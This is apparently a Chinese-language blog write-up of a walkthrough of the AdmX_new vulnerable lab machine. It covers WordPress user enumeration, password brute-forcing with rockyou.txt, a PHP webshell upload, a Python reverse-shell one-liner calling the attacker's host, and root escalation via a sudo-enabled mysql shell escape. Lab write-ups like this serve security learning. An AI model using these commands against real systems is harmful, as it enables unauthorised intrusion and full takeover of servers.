


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
  <title>AdmX_new靶机笔记(wordpress) [ Hexo ]</title>
  <!-- bootstrapcss文件 -->
 <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
<!--   
<link rel="stylesheet" href="/css/zhl.css">

 -->
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="/css/fork-awesome.min.css">
    
      <link rel="stylesheet" href="/css/zhl.css">
    
  
  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
<div class="container-fluid">
  <div class="row">
  <div id="wrap" class="col-md-12">
    <div id="header">
	<div id="header-left">
	<h1 id="header-title"> 
	<a href="/">
		Hexo
	</a>
	</h1>
	
	</div>
	<div id="header-right">
		
		
		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
		
		<a target="_blank" rel="noopener" href="https://github.com/moyan222/moyan222.github.io"  title="demo"><i class="fa fa-code ">demo</i></a>
		
		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
		
		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
		
		
	</div>
</div>

  </div>
  </div>
  <div id="content" class="row">
    <div id="content-left" class="col-md-4">
      

	

	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-tags">标签</h3>
		<div class="widget tags">
		<a class="tag-span-link" href="/tags/ACL/" rel="tag">ACL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ARP%E6%8A%93%E5%8C%85/" rel="tag">ARP抓包<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/HTML/" rel="tag">HTML<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/JS/" rel="tag">JS<span class="tag-span-count">5</span></a> <a class="tag-span-link" href="/tags/PHP/" rel="tag">PHP<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/STP/" rel="tag">STP<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/VLAN/" rel="tag">VLAN<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/http%E8%AF%B7%E6%B1%82-%E7%81%AB%E7%8B%90%E4%BB%A3%E7%90%86%E5%AE%89%E8%A3%85/" rel="tag">http请求+火狐代理安装<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/markdown%E8%AF%AD%E6%B3%95/" rel="tag">markdown语法<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/" rel="tag">关于主题<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0/" rel="tag">分享笔记<span class="tag-span-count">4</span></a> <a class="tag-span-link" href="/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">博客的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">图床的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" rel="tag">数据通信网络基础<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" rel="tag">永恒之蓝<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E7%AB%AF%E5%8F%A3/" rel="tag">端口<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" rel="tag">链路聚合<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/" rel="tag">静态路由<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/" rel="tag">靶机笔记<span class="tag-span-count">9</span></a>
		</div>
	</div>


	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-archive">归档</h3>
		<div class="widget">
			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">72</span></li></ul>
		</div>
	</div>



    </div>
    <div id="content-right" class="col-md-8">
    
<article id="post">
	<div class="post-title">
  <h1>AdmX_new靶机笔记(wordpress)</h1>
  	</div>
  <div class="page-meta">
  	<span class="fa-wrap">
  		<i class="fa fa-clock-o"></i>
  		<span class="date-meta">2023-10-28</span>
  	</span>
  	<span class="fa-wrap">
  		
  		<i class="fa fa-tags"></i>
  		<span class="tags-meta">靶机笔记</span>
  		
  	</span>
  	<span class="fa-wrap">
  		
  	</span>
  </div>
  <div class="post-content">
  <h1 id="AdmX-new靶机过程"><a href="#AdmX-new靶机过程" class="headerlink" title="AdmX_new靶机过程"></a>AdmX_new靶机过程</h1><p>Kali Linux自带的字典在路径 <strong>&#x2F;usr&#x2F;share&#x2F;wordlists</strong></p>
<p>.&#x2F;dirsearch.py -u 目标网址 -e *</p>
<p>其中，-u参数用于指定目标网址，-e参数用于指定要搜索的后缀文件类型，这里是”*”，表示搜索所有类型的文件。执行该命令后，dirsearch将会列出目标目录中存在的所有文件和目录，并显示它们的状态码、大小、扫描时间等信息。</p>
<h2 id="1-用VMware导入虚拟机"><a href="#1-用VMware导入虚拟机" class="headerlink" title="1.用VMware导入虚拟机"></a>1.用VMware导入虚拟机</h2><p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282055004.png" alt="image-20231028205522846">                               </p>
<h2 id="2-查看MAC地址"><a href="#2-查看MAC地址" class="headerlink" title="2.查看MAC地址"></a>2.查看MAC地址</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282055031.png" alt="image-20231028205534625"></p>
<h2 id="3-扫描本地局域网查找靶机IP"><a href="#3-扫描本地局域网查找靶机IP" class="headerlink" title="3.扫描本地局域网查找靶机IP"></a>3.扫描本地局域网查找靶机IP</h2><p>arp-scan -l eth1 -I</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282055379.png" alt="image-20231028205542962"></p>
<h2 id="4-扫描端口进行信息收集"><a href="#4-扫描端口进行信息收集" class="headerlink" title="4.扫描端口进行信息收集"></a>4.扫描端口进行信息收集</h2><p>nmap -A 192.168.70.133 发现80端口开放 并为Apache服务</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282055725.png" alt="image-20231028205554595"></p>
<h2 id="5-访问192-168-70-133"><a href="#5-访问192-168-70-133" class="headerlink" title="5.访问192.168.70.133"></a>5.访问192.168.70.133</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282056520.png" alt="image-20231028205603396"></p>
<h2 id="6-目录扫描"><a href="#6-目录扫描" class="headerlink" title="6.目录扫描"></a>6.目录扫描</h2><p>发现三个页面，依次访问</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282056346.png" alt="image-20231028205623083"></p>
<p>192.168.70.133&#x2F;index.html</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282056106.png" alt="image-20231028205636091"></p>
<p>192.168.70.133&#x2F;wordpress&#x2F;wp-login.php</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282056927.png" alt="image-20231028205646987"></p>
<p>192.168.70.133&#x2F;wordpress</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282056056.png" alt="image-20231028205658119"></p>
<h2 id="7-抓包分析"><a href="#7-抓包分析" class="headerlink" title="7.抓包分析"></a>7.抓包分析</h2><p>对192.168.70.133&#x2F;wordpress&#x2F;wp-login.php进行抓包</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282057216.png" alt="image-20231028205708046"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282057257.png" alt="image-20231028205715156"></p>
<p>发入重发器进行观察</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282057249.png" alt="image-20231028205724257"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282057549.png" alt="image-20231028205737408"></p>
<p>可以看到在第一个请求的响应体里有多个 192.168.159.145 地址，下面的请求都是从第一个请求的响应体里发出，但由于请求不成功才导致页面的卡顿。尝试让页面加载时的请求全部指向本机。配置如下：注意是响应包</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282057727.png" alt="image-20231028205745871"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058993.png" alt="image-20231028205759981"></p>
<p>放包然后发现正常回显</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058986.png" alt="image-20231028205810105"></p>
<h2 id="8-用wpscan探测出登录用户名为admin"><a href="#8-用wpscan探测出登录用户名为admin" class="headerlink" title="8.用wpscan探测出登录用户名为admin"></a>8.用wpscan探测出登录用户名为admin</h2><p><strong>wpscan –url</strong> <a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress"><strong>http://192.168.70.133/wordpress</strong></a> <strong>–enumerate</strong></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058796.png" alt="image-20231028205818775"></p>
<p>用户名为admin</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058033.png" alt="image-20231028205827004"></p>
<h2 id="9-利用rockyou-txt字典爆破"><a href="#9-利用rockyou-txt字典爆破" class="headerlink" title="9.利用rockyou.txt字典爆破"></a>9.利用rockyou.txt字典爆破</h2><p>尝试使用指定的用户名（admin）和密码字典（rockyou.txt）对指定的WordPress网站（<a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E3%80%82**wpscan">http://192.168.70.133/wordpress）进行暴力破解攻击。**wpscan</a> –url <a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress">http://192.168.70.133/wordpress</a> -U admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt**</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058118.png" alt="image-20231028205835691"></p>
<p>密码adam14</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058353.png" alt="image-20231028205845634"></p>
<h2 id="10-输入密码登录"><a href="#10-输入密码登录" class="headerlink" title="10.输入密码登录"></a>10.输入密码登录</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282058973.png" alt="image-20231028205853956"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282059802.png" alt="image-20231028205902731"></p>
<h2 id="11-尝试上传一句话木马（GET）"><a href="#11-尝试上传一句话木马（GET）" class="headerlink" title="11.尝试上传一句话木马（GET）"></a>11.尝试上传一句话木马（GET）</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282059832.png" alt="image-20231028205909303"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282059568.png" alt="image-20231028205925672"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282059137.png" alt="image-20231028205941074"></p>
<p>发现能执行命令<a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=system(id)">http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=system(id)</a>;</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282059126.png" alt="image-20231028205949234"></p>
<h2 id="12-反弹shell"><a href="#12-反弹shell" class="headerlink" title="12.反弹shell"></a>12.反弹shell</h2><p>[<a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=eval(system($_GET%5B1%5C%5D));&1=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.70.132%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27">http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=eval(system($_GET[1\]));&amp;1=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.70.132%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</a>   ](<a target="_blank" rel="noopener" href="http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=eval(system($_GET%5B1%5D));&1=python3">http://192.168.70.133/wordpress/wp-admin/plugins/8.php?cmd=eval(system($_GET[1]));&amp;1=python3</a> -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.70.132”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’)</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282100412.png" alt="image-20231028210022697"></p>
<p>cat &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看有哪些用户</p>
<p>发现wpadmin是&#x2F;bin&#x2F;bash</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282100047.png" alt="image-20231028210031019"></p>
<p>cd &#x2F;home&#x2F;wpadmin &#x2F;&#x2F;cd到这个目录下看看有什么东西</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282100455.png" alt="image-20231028210040580"></p>
<p>ls</p>
<p>cat local.txt  &#x2F;&#x2F;想要查看这个文件发现没有权限</p>
<p>su wpadmin  &#x2F;&#x2F;切换到wpadmin用户</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282100340.png" alt="image-20231028210048330"></p>
<p>cat local.txt </p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282100056.png" alt="image-20231028210056072"></p>
<p>which python3发现有python3在&#x2F;usr&#x2F;bin下</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282101266.png" alt="image-20231028210104260"></p>
<h2 id="13-连接数据库"><a href="#13-连接数据库" class="headerlink" title="13.连接数据库"></a>13.连接数据库</h2><p>sudo -l &#x2F;&#x2F;在输入 <code>sudo -l</code> 之后，系统将返回一个列表，其中包含当前用户可以运行的所有 sudo 命令。如果一个命令在列表中不存在，那么当前用户就不能运行该命令。</p>
<p>可以发现有<strong>root NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql -u root -D wordpress -p</strong></p>
<p><strong>这个命令表示不用使用密码就能登陆到<strong><strong>root</strong></strong>用户</strong></p>
<p>随便输入一个密码即可登录</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282101408.png" alt="image-20231028210117268"></p>
<p>ls</p>
<p>! &#x2F;bin&#x2F;bash</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282101153.png" alt="image-20231028210125052"></p>
<p>id  &#x2F;&#x2F;发现是root权限</p>
<p>cd &#x2F;root &#x2F;&#x2F;cd到root目录下</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282101092.png" alt="image-20231028210144103"></p>
<p>cat proof.txt</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282101951.png" alt="image-20231028210150072"></p>
<p>完成</p>
<p>小笔记</p>
<p>sudo apt install seclists -y  &#x2F;&#x2F;‘apt install seclists -y’这个命令的含义是：使用apt来安装名为’seclists’的软件包，’-y’参数的作用是在询问是否继续安装时自动回答’yes’，也就是说，这个命令会自动确认并继续安装，不需要人工干预。安装字典</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282102040.png" alt="image-20231028210222394"></p>
<p>sudo apt install feroxbuster -y &#x2F;&#x2F;安装扫描工具</p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282102928.png" alt="image-20231028210232826"></p>
<p>feroxbuster –url <a target="_blank" rel="noopener" href="http://192.168.70.133/">http://192.168.70.133</a></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282102702.png" alt="image-20231028210240829"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282102470.png" alt="image-20231028210250516"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282102824.png" alt="image-20231028210257008"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282103817.png" alt="image-20231028210305697"></p>
<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282103341.png" alt="image-20231028210313486"></p>

	</div>
</article>



    </div>
  </div>
  <div class="row">
<div id="bottom" class="col-md-12"> 
  <div class="bottom-nav">
	
	
	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
	
	
</div>
<div class="bottom-info">
	&copy; 2023 John Doe<br>
	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
</div>
</div>
</div>
</div>
<div id="tool">
  <ul>
    <li class="fa fa-angle-up top" id="top"></li>
  </ul>
</div>
  <div class="bg_content">
    <canvas id="canvas"></canvas>
  </div>
  
  <!-- scripts list from theme config.yml -->
  
    <script src="/js/zhl.js"></script>
  
    <script src="/js/bj.js"></script>
  

<!-- jQ cdn  -->
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<!-- bootstrap js cdn-->
<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->


</body>
</html>
